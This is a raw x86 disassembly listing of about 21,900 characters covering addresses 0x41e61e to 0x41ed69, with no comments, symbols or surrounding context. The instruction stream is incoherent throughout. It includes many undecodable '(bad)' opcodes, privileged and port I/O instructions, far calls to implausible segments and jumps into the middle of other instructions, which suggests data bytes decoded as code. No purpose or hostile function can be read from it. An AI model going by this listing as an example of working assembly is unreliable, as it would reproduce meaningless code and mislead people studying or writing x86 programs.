  41e61e:	pop    esi
  41e61f:	mov    al,ds:0x40d9a040
  41e624:	jo     0x41e66a
  41e626:	xor    al,0x72
  41e628:	fsubr  DWORD PTR [eax]
  41e62a:	call   0xe0d624c2
  41e62f:	push   edi
  41e630:	mov    dh,0xf2
  41e632:	inc    ebx
  41e633:	dec    ebp
  41e634:	cmp    ch,0x8c
  41e637:	sbb    ch,cl
  41e639:	push   eax
  41e63a:	jno    0x41e5e1
  41e63c:	repz or esp,edx
  41e63f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e640:	iret   
  41e641:	popa   
  41e642:	xor    ecx,eax
  41e644:	fisub  DWORD PTR [edi+0x47]
  41e647:	aam    0x97
  41e649:	cmp    eax,0x120e965a
  41e64e:	mov    WORD PTR [edx],es
  41e650:	(bad)  
  41e651:	jmp    0xc9cef73
  41e656:	adc    DWORD PTR [ecx+0x75],ebp
  41e659:	pop    ebp
  41e65a:	pushf  
  41e65b:	aaa    
  41e65c:	xchg   ebp,eax
  41e65d:	push   edx
  41e65e:	shr    BYTE PTR [ebx-0x15],1
  41e661:	adc    DWORD PTR [edx-0x2b],ebp
  41e664:	rcl    DWORD PTR ds:0x98326536,cl
  41e66a:	es inc esp
  41e66c:	outs   dx,BYTE PTR ds:[esi]
  41e66d:	pop    esi
  41e66e:	xchg   BYTE PTR [edi+eax*8],ah
  41e671:	shl    BYTE PTR [ebx+0x15],cl
  41e674:	sbb    eax,0xe5d43e68
  41e679:	fs pop eax
  41e67b:	mov    ?,WORD PTR [eax+edi*1+0x6c]
  41e67f:	xchg   edi,eax
  41e680:	xchg   edi,eax
  41e681:	std    
  41e682:	and    DWORD PTR [ebp-0x6c],ebx
  41e685:	push   edx
  41e686:	addr16 adc dl,dl
  41e689:	inc    ebx
  41e68a:	mov    al,0xd7
  41e68c:	pop    ds
  41e68d:	jecxz  0x41e695
  41e68f:	adc    eax,0x5740e481
  41e694:	push   0x28
  41e696:	jne    0x41e6e0
  41e698:	sbb    BYTE PTR [edx],ch
  41e69a:	and    ebx,DWORD PTR [esi+esi*2+0x9]
  41e69e:	pop    edx
  41e69f:	icebp  
  41e6a0:	jbe    0x41e6cb
  41e6a2:	xchg   ecx,eax
  41e6a3:	jle    0x41e676
  41e6a5:	icebp  
  41e6a6:	dec    esp
  41e6a7:	shl    DWORD PTR [edi-0x1f],1
  41e6aa:	or     al,0xc0
  41e6ac:	push   ebp
  41e6ad:	jecxz  0x41e661
  41e6af:	adc    edx,DWORD PTR [ebx]
  41e6b1:	mov    edx,0xde627448
  41e6b6:	sub    ebx,DWORD PTR [edi+0x61f72b89]
  41e6bc:	inc    eax
  41e6bd:	sti    
  41e6be:	or     esp,edi
  41e6c0:	mov    dh,0xfd
  41e6c2:	add    al,0x6b
  41e6c4:	xor    BYTE PTR [eax],cl
  41e6c6:	sub    esi,DWORD PTR [esi+0x6f]
  41e6c9:	call   0xf93c:0xbaa6ce01
  41e6d0:	cmp    al,0x9a
  41e6d2:	sub    BYTE PTR [edx],bh
  41e6d4:	mov    bl,0x27
  41e6d6:	fcmovne st,st(6)
  41e6d8:	mov    eax,0xdede563d
  41e6dd:	cmp    BYTE PTR [esi+0x0],al
  41e6e0:	inc    edi
  41e6e1:	pop    edi
  41e6e2:	idiv   DWORD PTR [ebx+0x6e2369e1]
  41e6e8:	inc    ebx
  41e6e9:	call   0xfa3ebb24
  41e6ee:	js     0x41e6fb
  41e6f0:	pop    ebp
  41e6f1:	and    DWORD PTR [eax-0x1e5b1c73],edx
  41e6f7:	xor    BYTE PTR [ebx],ch
  41e6f9:	test   DWORD PTR [ebp-0xa],0x6165d0e6
  41e700:	inc    esp
  41e701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e702:	add    ecx,DWORD PTR [edi-0x366dd55e]
  41e708:	cmc    
  41e709:	in     eax,0xdf
  41e70b:	fcom   DWORD PTR [ecx]
  41e70d:	ror    DWORD PTR [ecx],0x5b
  41e710:	jns    0x41e78e
  41e712:	rol    DWORD PTR fs:[ebx+0x17],1
  41e716:	mov    ds:0x254fdfd7,al
  41e71b:	cwde   
  41e71c:	outs   dx,BYTE PTR ds:[esi]
  41e71d:	mov    cl,0xe0
  41e71f:	sti    
  41e720:	dec    esi
  41e721:	pop    eax
  41e722:	sub    bh,cl
  41e724:	in     al,0xdc
  41e726:	sbb    al,0xf0
  41e728:	pop    eax
  41e729:	fisubr DWORD PTR [eax+0x63]
  41e72c:	(bad)  
  41e72d:	retf   
  41e72e:	push   eax
  41e72f:	inc    ebx
  41e730:	(bad)  
  41e731:	aas    
  41e732:	mov    ebx,0x69a6350f
  41e737:	mov    ebp,0x5bdb85d
  41e73c:	stc    
  41e73d:	add    al,0x20
  41e73f:	pop    es
  41e740:	into   
  41e741:	push   esp
  41e742:	(bad)  
  41e743:	test   BYTE PTR [esi-0x59983e8c],dh
  41e749:	stos   BYTE PTR es:[edi],al
  41e74a:	jnp    0x41e75b
  41e74c:	push   eax
  41e74d:	or     BYTE PTR [esi],0xfe
  41e750:	je     0x41e712
  41e752:	mov    al,0x3e
  41e754:	fadd   DWORD PTR [ebp-0x98ade9b]
  41e75a:	pop    eax
  41e75b:	(bad)  
  41e75c:	sbb    al,0x6d
  41e75e:	dec    esi
  41e75f:	xchg   edi,eax
  41e760:	inc    edi
  41e761:	mov    gs,WORD PTR [eax+0x5e]
  41e764:	mov    esp,0xc570e2e5
  41e769:	jne    0x41e706
  41e76b:	push   ebx
  41e76c:	push   ecx
  41e76d:	test   eax,0x388d1907
  41e772:	test   DWORD PTR [edx],ebx
  41e774:	mov    ecx,0xa4bafbec
  41e779:	mov    al,0x1a
  41e77b:	ds cli 
  41e77d:	cli    
  41e77e:	(bad)  
  41e77f:	in     eax,0x16
  41e781:	mov    DWORD PTR [edx],ebx
  41e783:	add    bh,BYTE PTR [ebp-0x6990e8da]
  41e789:	xor    eax,0x826602f1
  41e78e:	jnp    0x41e775
  41e790:	fdiv   DWORD PTR [edx+0x28]
  41e793:	sahf   
  41e794:	aam    0xb4
  41e796:	mov    ebx,0xbf586626
  41e79c:	or     al,0x1b
  41e79e:	out    0xd,al
  41e7a0:	xor    eax,0xab0c3ec8
  41e7a5:	mov    al,0xc7
  41e7a7:	pop    edi
  41e7a8:	dec    edi
  41e7a9:	mov    bl,0xb6
  41e7ab:	push   0x2d15b583
  41e7b0:	and    eax,0xffe15072
  41e7b5:	xchg   esp,eax
  41e7b6:	add    DWORD PTR ds:[eax],0xd2546e43
  41e7bd:	push   ds
  41e7be:	mov    esp,edi
  41e7c0:	rcl    BYTE PTR [ecx-0x27],1
  41e7c3:	test   eax,0xb7b43920
  41e7c8:	out    dx,al
  41e7c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ca:	push   ecx
  41e7cb:	in     eax,dx
  41e7cc:	mov    ds:0xb04d52d2,eax
  41e7d1:	pushf  
  41e7d2:	rcr    BYTE PTR [ebp-0x32210261],1
  41e7d8:	sbb    al,0xc3
  41e7da:	push   esi
  41e7db:	or     al,dl
  41e7dd:	mov    ecx,0xbe7e96c2
  41e7e2:	cmp    ecx,esp
  41e7e4:	in     al,dx
  41e7e5:	inc    edi
  41e7e6:	or     DWORD PTR [ebp+0x5],0x8c543904
  41e7ed:	adc    al,0xff
  41e7ef:	sub    al,0x97
  41e7f1:	test   al,0x1b
  41e7f3:	mov    ah,0x1c
  41e7f5:	les    edx,FWORD PTR [edi+0x3ce7e532]
  41e7fb:	sub    DWORD PTR [ebp+0x50],esp
  41e7fe:	add    DWORD PTR [ebp+0x53],esi
  41e801:	mov    ecx,0x4ce515b
  41e806:	cmp    BYTE PTR [ebp+0x4c],0x43
  41e80a:	hlt    
  41e80b:	shl    al,1
  41e80d:	cmp    BYTE PTR [ebx-0x4e8cf149],0xf4
  41e814:	inc    esp
  41e815:	leave  
  41e816:	cld    
  41e817:	xchg   esp,eax
  41e818:	mov    esi,0xc62e1a04
  41e81d:	loope  0x41e7f3
  41e81f:	jge    0x41e87d
  41e821:	loop   0x41e80a
  41e823:	pop    es
  41e824:	out    dx,eax
  41e825:	xchg   ebx,eax
  41e826:	sub    ebp,DWORD PTR [eax*2+0x334f83c]
  41e82d:	push   es
  41e82e:	jp     0x41e88a
  41e830:	int3   
  41e831:	je     0x41e849
  41e833:	stos   BYTE PTR es:[edi],al
  41e834:	mov    bl,0x6b
  41e836:	add    eax,0x334428d8
  41e83b:	ret    
  41e83c:	test   al,0xf6
  41e83e:	test   cl,dl
  41e840:	enter  0xf803,0x77
  41e844:	ficom  WORD PTR [ecx]
  41e846:	ja     0x41e8b7
  41e848:	out    dx,eax
  41e849:	sbb    eax,0x90afd1cc
  41e84e:	push   ecx
  41e84f:	push   esi
  41e850:	mov    WORD PTR [edi-0x19],es
  41e853:	or     dl,BYTE PTR [edi]
  41e855:	aam    0x3e
  41e857:	into   
  41e858:	cmc    
  41e859:	push   0x9111f6a3
  41e85e:	icebp  
  41e85f:	sahf   
  41e860:	jne    0x41e8c3
  41e862:	mov    eax,ds:0x642c80ce
  41e867:	mov    ch,0x20
  41e869:	lods   eax,DWORD PTR ss:[esi]
  41e86b:	rcr    dl,1
  41e86d:	xchg   ebx,eax
  41e86e:	scas   al,BYTE PTR es:[edi]
  41e86f:	jmp    0x41e819
  41e871:	test   al,0xe6
  41e873:	clc    
  41e874:	mov    DWORD PTR [esi+ecx*2+0x437efdc2],ebx
  41e87b:	mov    dl,0x6
  41e87d:	xor    edi,DWORD PTR [eax+0x29]
  41e880:	mov    al,ds:0x15554a79
  41e885:	mov    ds:0x80089dfc,eax
  41e88a:	stc    
  41e88b:	addr16 arpl di,bp
  41e88e:	sahf   
  41e88f:	and    bl,ah
  41e891:	sbb    DWORD PTR [ebx-0x6f],edi
  41e894:	sbb    al,0x62
  41e896:	dec    esp
  41e897:	inc    esp
  41e898:	xchg   edi,eax
  41e899:	dec    eax
  41e89a:	inc    edi
  41e89b:	fucomp st(6)
  41e89d:	addr16 in eax,dx
  41e89f:	add    al,0x57
  41e8a1:	add    BYTE PTR [edi],dl
  41e8a3:	push   es
  41e8a4:	scas   al,BYTE PTR es:[edi]
  41e8a5:	and    ah,BYTE PTR [edi-0x6e7043bb]
  41e8ab:	dec    ebp
  41e8ac:	shl    BYTE PTR [ecx],cl
  41e8ae:	inc    ecx
  41e8af:	sub    eax,0x652a6b2a
  41e8b4:	pop    ss
  41e8b5:	push   ss
  41e8b6:	jle    0x41e92c
  41e8b8:	sub    BYTE PTR [ecx-0x3985e78b],cl
  41e8be:	cmp    ecx,ecx
  41e8c0:	ss jns 0x41e918
  41e8c3:	adc    dl,dh
  41e8c5:	outs   dx,BYTE PTR ds:[esi]
  41e8c6:	dec    ebp
  41e8c7:	loop   0x41e87f
  41e8c9:	imul   ebp,DWORD PTR [esi+0x10],0xcee4a947
  41e8d0:	hlt    
  41e8d1:	jl     0x41e903
  41e8d3:	dec    eax
  41e8d4:	xrelease xchg BYTE PTR [eax],bh
  41e8d7:	call   0x4bc9c8b8
  41e8dc:	sub    esi,DWORD PTR [ebx]
  41e8de:	fsub   DWORD PTR [edi*8-0x2f96f9b1]
  41e8e5:	outs   dx,BYTE PTR ds:[esi]
  41e8e6:	or     BYTE PTR [esi+0x5b],bl
  41e8e9:	inc    ebx
  41e8ea:	leave  
  41e8eb:	nop
  41e8ec:	out    dx,eax
  41e8ed:	pusha  
  41e8ee:	jge    0x41e8cf
  41e8f0:	dec    esp
  41e8f1:	in     eax,dx
  41e8f2:	shl    BYTE PTR [eax],cl
  41e8f4:	cdq    
  41e8f5:	mov    BYTE PTR [eax+0x6bf57f24],bl
  41e8fb:	scas   eax,DWORD PTR es:[edi]
  41e8fc:	fsubr  QWORD PTR [ecx-0x2ccd4852]
  41e902:	xor    ah,BYTE PTR [bp+di-0xbc3]
  41e907:	push   ebp
  41e908:	mov    ch,0xcc
  41e90a:	(bad)  
  41e90b:	ret    0xbecc
  41e90e:	jnp    0x41e8bb
  41e910:	ret    0xb67e
  41e913:	inc    ebx
  41e914:	mov    dh,0x9a
  41e916:	add    al,0x38
  41e918:	push   edi
  41e919:	mov    edi,esi
  41e91b:	neg    BYTE PTR [eax-0x3ca261d4]
  41e921:	fs (bad) 
  41e925:	dec    eax
  41e926:	mov    al,0xd7
  41e928:	sbb    eax,0x9212fda8
  41e92d:	sbb    al,0x92
  41e92f:	dec    esp
  41e930:	mov    cl,0xb0
  41e932:	mov    ds:0x1597467b,eax
  41e937:	adc    DWORD PTR ss:[eax],edi
  41e93a:	mov    cl,0xf5
  41e93c:	dec    esi
  41e93d:	pop    ss
  41e93e:	pop    ebp
  41e93f:	jmp    0xe686f078
  41e944:	lahf   
  41e945:	push   eax
  41e946:	adc    esi,DWORD PTR [ebx-0x7f0b15b9]
  41e94c:	sbb    eax,0xc80eed1a
  41e951:	mov    ecx,0x7e58f956
  41e956:	mov    edi,0x15a1dcc
  41e95b:	je     0x41e965
  41e95d:	and    BYTE PTR [edx-0x3f],ch
  41e960:	lods   al,BYTE PTR ds:[esi]
  41e961:	repz ja 0x41e966
  41e964:	pop    ecx
  41e965:	ret    
  41e966:	inc    eax
  41e967:	fsubr  QWORD PTR [ebx+eiz*1-0x552781ad]
  41e96e:	stos   BYTE PTR es:[edi],al
  41e96f:	(bad)  
  41e970:	neg    DWORD PTR [eax-0x5]
  41e973:	stos   BYTE PTR es:[edi],al
  41e974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e975:	(bad)  
  41e976:	in     al,dx
  41e977:	sub    bl,bh
  41e979:	push   ebx
  41e97a:	fwait
  41e97b:	enter  0x776b,0x2
  41e97f:	mov    ebp,0x6c3610f7
  41e984:	pushf  
  41e985:	inc    esp
  41e986:	test   ebp,ecx
  41e988:	shl    ah,0x27
  41e98b:	mov    edi,0xd2d197e0
  41e990:	inc    edx
  41e991:	sar    BYTE PTR [bp-0x342e],cl
  41e996:	xchg   ebx,eax
  41e997:	inc    edi
  41e998:	jecxz  0x41e921
  41e99a:	push   ebp
  41e99b:	int    0x51
  41e99d:	div    DWORD PTR [ecx-0x74]
  41e9a0:	mov    esp,ecx
  41e9a2:	test   eax,0x4bf0711e
  41e9a7:	stos   BYTE PTR es:[edi],al
  41e9a8:	cmp    ecx,0xdb43e1b2
  41e9ae:	outs   dx,BYTE PTR ds:[esi]
  41e9af:	or     bh,BYTE PTR [edx-0xea05a38]
  41e9b5:	jecxz  0x41e9dd
  41e9b7:	sahf   
  41e9b8:	fild   WORD PTR [edx]
  41e9ba:	inc    eax
  41e9bb:	mov    cl,ch
  41e9bd:	ret    
  41e9be:	pop    ecx
  41e9bf:	dec    esi
  41e9c0:	jns    0x41e997
  41e9c2:	or     dl,BYTE PTR [ebx+0x31]
  41e9c5:	lahf   
  41e9c6:	push   edx
  41e9c7:	lahf   
  41e9c8:	inc    esi
  41e9c9:	cmp    eax,0xa17a47b2
  41e9ce:	xchg   esp,eax
  41e9cf:	sahf   
  41e9d0:	pop    ds
  41e9d1:	push   eax
  41e9d2:	mov    edx,0xcf5b40c1
  41e9d7:	out    dx,al
  41e9d8:	arpl   WORD PTR [ebx],bp
  41e9da:	addr16 sub al,0xef
  41e9dd:	or     DWORD PTR [ebp+0x52],edx
  41e9e0:	cmc    
  41e9e1:	outs   dx,BYTE PTR ds:[esi]
  41e9e2:	ror    BYTE PTR [ecx],0xbe
  41e9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9e7:	add    eax,DWORD PTR [edi+0x29]
  41e9ea:	das    
  41e9eb:	ja     0x41e9e5
  41e9ed:	out    0xef,eax
  41e9ef:	test   DWORD PTR [edx],esp
  41e9f1:	dec    edx
  41e9f2:	push   ss
  41e9f3:	js     0x41e98c
  41e9f5:	inc    ebp
  41e9f6:	test   al,0xd5
  41e9f8:	mov    ecx,0x79d58446
  41e9fd:	(bad)  
  41e9fe:	imul   esp,ecx,0x647d282f
  41ea04:	mov    al,0x4d
  41ea06:	or     dh,cl
  41ea08:	xchg   BYTE PTR [ecx+esi*1],bl
  41ea0b:	cmp    cl,dl
  41ea0d:	adc    eax,0xbb1ec180
  41ea12:	repz jno 0x41ea94
  41ea15:	inc    ebx
  41ea16:	or     esi,esi
  41ea18:	not    BYTE PTR [ebp-0x2acdefcb]
  41ea1e:	and    cl,dh
  41ea20:	and    al,0x60
  41ea22:	push   0xffffffff
  41ea24:	xor    BYTE PTR [ebp-0x42],ah
  41ea27:	mov    al,ds:0x9e8985da
  41ea2c:	leave  
  41ea2d:	lea    esp,[esi+edi*2+0x698e4df7]
  41ea34:	int    0xbb
  41ea36:	leave  
  41ea37:	ret    
  41ea38:	popa   
  41ea39:	cld    
  41ea3a:	outs   dx,DWORD PTR ds:[esi]
  41ea3b:	sahf   
  41ea3c:	fisub  DWORD PTR [ebx+0x1135b225]
  41ea42:	ret    
  41ea43:	mov    bl,0x7f
  41ea45:	sbb    eax,0x41b66654
  41ea4a:	sub    bl,bh
  41ea4c:	je     0x41e9ec
  41ea4e:	(bad)  
  41ea4f:	lahf   
  41ea50:	xchg   ecx,eax
  41ea51:	pushaw 
  41ea53:	(bad)  
  41ea54:	mov    ecx,0x53c8798e
  41ea59:	xor    esp,ebx
  41ea5b:	out    0x9f,al
  41ea5d:	shl    DWORD PTR [edx],cl
  41ea5f:	xchg   DWORD PTR [edx-0x5b],edx
  41ea62:	xchg   ebx,eax
  41ea63:	dec    esi
  41ea64:	js     0x41ea1e
  41ea66:	adc    bl,bh
  41ea68:	jne    0x41ea43
  41ea6a:	push   es
  41ea6b:	mov    ds:0x130c7950,al
  41ea70:	adc    eax,0x348f572a
  41ea75:	cmp    esp,DWORD PTR [ebp+ecx*1-0x11]
  41ea79:	push   ecx
  41ea7a:	mov    al,ds:0x4f2f593c
  41ea7f:	rol    ebx,0x2f
  41ea82:	int    0xda
  41ea84:	enter  0x8852,0x14
  41ea88:	dec    edx
  41ea89:	add    eax,DWORD PTR [ecx+0x51]
  41ea8c:	push   esp
  41ea8d:	icebp  
  41ea8e:	lea    esi,[eax+0x57]
  41ea91:	aam    0x25
  41ea93:	pop    DWORD PTR [ecx]
  41ea95:	mov    ds:0xb9458736,eax
  41ea9a:	or     al,0x55
  41ea9c:	popf   
  41ea9d:	mov    ss,WORD PTR [edx+0x34c311c5]
  41eaa3:	mov    bl,0x7e
  41eaa5:	test   al,0x35
  41eaa7:	pop    ebp
  41eaa8:	jmp    0x8a510dcd
  41eaad:	and    bl,BYTE PTR [ebp-0x40f1147c]
  41eab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eab4:	mov    al,0x1f
  41eab6:	loopne 0x41eb01
  41eab8:	xchg   DWORD PTR [edx-0xd],esi
  41eabb:	adc    edx,DWORD PTR [eax+0x64]
  41eabe:	psrld  mm5,mm3
  41eac1:	inc    esp
  41eac2:	retf   
  41eac3:	mov    eax,ds:0x3db91884
  41eac8:	dec    ecx
  41eac9:	js     0x41ea8c
  41eacb:	inc    ecx
  41eacc:	cmp    al,0xbd
  41eace:	mov    ah,0x74
  41ead0:	mov    al,0x80
  41ead2:	pop    edi
  41ead3:	pop    ebp
  41ead4:	in     al,dx
  41ead5:	shr    eax,1
  41ead7:	retf   
  41ead8:	fnstcw WORD PTR [edx+0x4dc4703f]
  41eade:	sbb    BYTE PTR [eax-0x2d],bh
  41eae1:	cmp    ebx,ebx
  41eae3:	iret   
  41eae4:	loopne 0x41ea9a
  41eae6:	sbb    eax,0x180965fe
  41eaeb:	stc    
  41eaec:	sbb    bl,ah
  41eaee:	lock fiadd WORD PTR [ecx-0x1f]
  41eaf2:	daa    
  41eaf3:	enter  0xffc1,0xf
  41eaf7:	(bad)  
  41eaf8:	int    0xec
  41eafa:	cmc    
  41eafb:	sub    eax,0x77a8dde3
  41eb00:	adc    ch,BYTE PTR [esi]
  41eb02:	xor    BYTE PTR [ebx-0x32],bh
  41eb05:	(bad)  
  41eb06:	mov    es,WORD PTR [ecx+ebx*4]
  41eb09:	clc    
  41eb0a:	jbe    0x41eb55
  41eb0c:	lds    edi,FWORD PTR [edx-0x68d4af17]
  41eb12:	inc    esi
  41eb13:	xlat   BYTE PTR ds:[ebx]
  41eb14:	pop    ebp
  41eb15:	adc    DWORD PTR [ebp-0x35],ecx
  41eb18:	ret    
  41eb19:	ja     0x41eb74
  41eb1b:	sbb    al,0x71
  41eb1d:	enter  0x5d93,0x82
  41eb21:	add    eax,0x4eb48c0f
  41eb26:	pop    edi
  41eb27:	mov    ecx,0xe92e81f3
  41eb2c:	add    dh,BYTE PTR [ebp+ebp*1+0x4873f2d6]
  41eb33:	mov    ebx,0xfcb198da
  41eb38:	xor    edi,0xffffff83
  41eb3b:	stos   BYTE PTR es:[edi],al
  41eb3c:	add    BYTE PTR [ebx],dh
  41eb3e:	jno    0x41eb64
  41eb40:	shr    BYTE PTR [ecx+edx*1+0x61],cl
  41eb44:	push   0xdcfe0c47
  41eb49:	ror    DWORD PTR [ecx],1
  41eb4b:	mov    ebx,0x64e094b3
  41eb50:	pop    esi
  41eb51:	ins    DWORD PTR es:[edi],dx
  41eb52:	sub    WORD PTR [ebp-0x45],si
  41eb56:	nop
  41eb57:	rcl    BYTE PTR [edi-0x8],1
  41eb5a:	pop    esi
  41eb5b:	in     eax,0x7d
  41eb5d:	push   edx
  41eb5e:	push   ds
  41eb5f:	pslld  mm2,QWORD PTR [edx+eax*1+0x6ad2753e]
  41eb67:	pop    edi
  41eb68:	mov    edi,0x8eb44120
  41eb6d:	ins    DWORD PTR es:[edi],dx
  41eb6e:	inc    edx
  41eb6f:	adc    al,0x35
  41eb71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb72:	ja     0x41ebb0
  41eb74:	mov    ecx,0x3a43b422
  41eb79:	call   0x5e2c:0x2b9d1592
  41eb80:	scas   al,BYTE PTR es:[edi]
  41eb81:	jns    0x41eb0b
  41eb83:	fadd   DWORD PTR [esi+0x75]
  41eb86:	jmp    0x41ebd6
  41eb88:	dec    eax
  41eb89:	dec    eax
  41eb8a:	push   esi
  41eb8b:	pop    ds
  41eb8c:	call   0x3664486b
  41eb91:	and    al,0xc5
  41eb93:	popa   
  41eb94:	jb     0x41ebe7
  41eb96:	imul   ecx,DWORD PTR ds:0x6fba,0xffffffaa
  41eb9c:	dec    DWORD PTR [ebx+0xf]
  41eb9f:	je     0x41ebe3
  41eba1:	call   0x3132873f
  41eba6:	push   ds
  41eba7:	cwde   
  41eba8:	mov    al,0x91
  41ebaa:	es scas eax,DWORD PTR es:[edi]
  41ebac:	fmul   DWORD PTR [eax+0xcfaf8da]
  41ebb2:	loopne 0x41eb50
  41ebb4:	sbb    eax,0x70c32d5f
  41ebb9:	xor    eax,edi
  41ebbb:	cmp    al,0xaa
  41ebbd:	or     DWORD PTR [edi],esi
  41ebbf:	xchg   ebx,eax
  41ebc0:	pop    eax
  41ebc1:	inc    ebx
  41ebc2:	mov    BYTE PTR [ebx+0x7b],dh
  41ebc5:	xchg   ecx,eax
  41ebc6:	imul   eax,DWORD PTR [ebp+0x20],0xb6861f26
  41ebcd:	shr    BYTE PTR [eax+0xf9ea8d7],1
  41ebd3:	push   edi
  41ebd4:	mov    ebp,0xa5c0c510
  41ebd9:	nop
  41ebda:	or     al,al
  41ebdc:	dec    ebp
  41ebdd:	rcl    BYTE PTR [edx],0x26
  41ebe0:	imul   ebx,DWORD PTR [ebx],0xffffff8b
  41ebe3:	cmp    dh,BYTE PTR [eax+eax*2+0x7ef96632]
  41ebea:	in     al,0x72
  41ebec:	sbb    eax,0xb4ff260b
  41ebf1:	xor    al,0x8a
  41ebf3:	mov    al,ds:0x19964af0
  41ebf8:	push   0x1d
  41ebfa:	retf   0x1a1e
  41ebfd:	mov    esp,ecx
  41ebff:	cmp    eax,0x19ea593d
  41ec04:	cmp    DWORD PTR [ebx-0x1a],esp
  41ec07:	in     al,dx
  41ec08:	pop    ebx
  41ec09:	adc    DWORD PTR [eax+ecx*2-0x1d3791ae],esp
  41ec10:	adc    ebp,esi
  41ec12:	in     eax,dx
  41ec13:	jae    0x41ec1a
  41ec15:	xchg   BYTE PTR [edi+edi*8],bl
  41ec18:	icebp  
  41ec19:	fisttp DWORD PTR [ecx]
  41ec1b:	pusha  
  41ec1c:	add    BYTE PTR [ecx-0x595f9e10],dl
  41ec22:	mov    ebp,0x7daac9ca
  41ec27:	push   esp
  41ec28:	imul   eax,edi,0xde84a05
  41ec2e:	int    0xcf
  41ec30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec31:	xchg   esi,eax
  41ec32:	and    al,0xb2
  41ec34:	outs   dx,DWORD PTR fs:[esi]
  41ec36:	xor    cl,BYTE PTR [esi+0x3]
  41ec39:	mov    WORD PTR [esi],?
  41ec3b:	xchg   esp,eax
  41ec3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec3d:	pop    ebp
  41ec3e:	call   0xc0c4:0xd3384a31
  41ec45:	mov    WORD PTR [ecx-0x1d740dc0],ss
  41ec4b:	mov    BYTE PTR [edx-0x59e0e154],0x5
  41ec52:	push   ecx
  41ec53:	lock (bad) 
  41ec55:	in     eax,dx
  41ec56:	inc    ebp
  41ec57:	sbb    eax,DWORD PTR [edi]
  41ec59:	push   edi
  41ec5a:	aas    
  41ec5b:	div    BYTE PTR [ecx]
  41ec5d:	sub    edi,DWORD PTR [edi]
  41ec5f:	or     eax,0x1494f69f
  41ec64:	cmp    BYTE PTR [ebx+0x52],bl
  41ec67:	cmp    al,BYTE PTR [eax+0x5a]
  41ec6a:	in     eax,0xcd
  41ec6c:	test   al,0xdb
  41ec6e:	or     DWORD PTR [eax+0x43],ebp
  41ec71:	add    BYTE PTR [edx+0x58],ah
  41ec74:	jg     0x41ec37
  41ec76:	xor    ebp,DWORD PTR [ecx]
  41ec78:	(bad)  
  41ec7a:	or     eax,0x1fd3ce41
  41ec7f:	cmp    al,0x29
  41ec81:	(bad)  [ebp-0x13]
  41ec84:	mov    edi,0xf584b052
  41ec89:	xchg   edx,eax
  41ec8a:	out    0xdf,al
  41ec8c:	fucomi st,st(4)
  41ec8e:	popa   
  41ec8f:	inc    ecx
  41ec90:	inc    ebp
  41ec91:	(bad)
  41ec94:	inc    esi
  41ec95:	scas   al,BYTE PTR es:[edi]
  41ec96:	dec    eax
  41ec97:	test   al,0x67
  41ec99:	xor    ebp,DWORD PTR [ecx]
  41ec9b:	sar    dl,0x60
  41ec9e:	push   0x395bc914
  41eca3:	fidivr WORD PTR [edi-0x4b]
  41eca6:	push   ds
  41eca7:	adc    ch,BYTE PTR [eax+0x78c0b9cb]
  41ecad:	lahf   
  41ecae:	rol    DWORD PTR [esi],cl
  41ecb0:	cmp    al,0x48
  41ecb2:	shrd   DWORD PTR ds:0x1e745956,esp,cl
  41ecb9:	or     edi,DWORD PTR [esi+0x5f92a634]
  41ecbf:	jbe    0x41ed3b
  41ecc1:	mov    esi,0x25b6373d
  41ecc6:	inc    ebp
  41ecc7:	sbb    al,0x87
  41ecc9:	enter  0x661,0x65
  41eccd:	dec    ebx
  41ecce:	mov    es,WORD PTR [edx-0x78677111]
  41ecd4:	adc    al,0x6b
  41ecd6:	inc    edi
  41ecd7:	dec    esp
  41ecd8:	data16 and al,0x45
  41ecdb:	or     esp,DWORD PTR [edx]
  41ecdd:	lods   eax,DWORD PTR ds:[esi]
  41ecde:	fidivr WORD PTR [ecx-0x2eea09f0]
  41ece4:	js     0x41ecea
  41ece6:	fbstp  TBYTE PTR gs:[edx-0x13]
  41ecea:	repz aad 0xca
  41eced:	push   ecx
  41ecee:	mov    bh,0x1d
  41ecf0:	shl    BYTE PTR [ebx+esi*4+0x21],cl
  41ecf4:	mov    dh,0xab
  41ecf6:	push   eax
  41ecf7:	mov    bh,0x34
  41ecf9:	jnp    0x41ed16
  41ecfb:	dec    edi
  41ecfc:	outs   dx,BYTE PTR ds:[esi]
  41ecfd:	dec    edx
  41ecfe:	mov    cs,WORD PTR [ebx+0x15]
  41ed01:	jl     0x41ecc5
  41ed03:	sub    esi,ebp
  41ed05:	cld    
  41ed06:	sbb    edi,esi
  41ed08:	je     0x41ed02
  41ed0a:	mov    al,ds:0x3ab6c8d6
  41ed0f:	sti    
  41ed10:	mov    ds:0x7392ea74,al
  41ed15:	js     0x41ecb6
  41ed17:	test   eax,0x88ac3b12
  41ed1c:	cmp    ebp,DWORD PTR [ebx-0x7f73ce30]
  41ed22:	mov    esi,DWORD PTR [esi-0x77]
  41ed25:	and    eax,0x63f7e964
  41ed2a:	mov    dh,0x5
  41ed2c:	push   edx
  41ed2d:	xor    eax,0xfbe5613a
  41ed32:	mov    bh,0x2c
  41ed34:	retf   
  41ed35:	and    eax,0xf0d8c562
  41ed3a:	repnz sub DWORD PTR [edi+0x39],ebp
  41ed3e:	or     esi,DWORD PTR [ebp+0x40]
  41ed41:	pop    ebx
  41ed42:	retf   0x5f68
  41ed45:	popf   
  41ed46:	jno    0x41ecf4
  41ed48:	adc    esi,DWORD PTR [ecx]
  41ed4a:	ror    esi,0x82
  41ed4d:	jo     0x41ed82
  41ed4f:	mov    WORD PTR [esi+0x6],fs
  41ed52:	or     bh,BYTE PTR [esi]
  41ed54:	dec    dx
  41ed56:	xor    BYTE PTR [esi-0x5c],bh
  41ed59:	jnp    0x41ed07
  41ed5b:	ret    
  41ed5c:	add    DWORD PTR [ebx+0x6b],eax
  41ed5f:	fadd   DWORD PTR es:[edx]
  41ed62:	mov    ds:0xfa3b2ca3,eax
  41ed67:	cmp    BYTE PTR [ecx],ah
  41ed69:	jl     0x41ed07
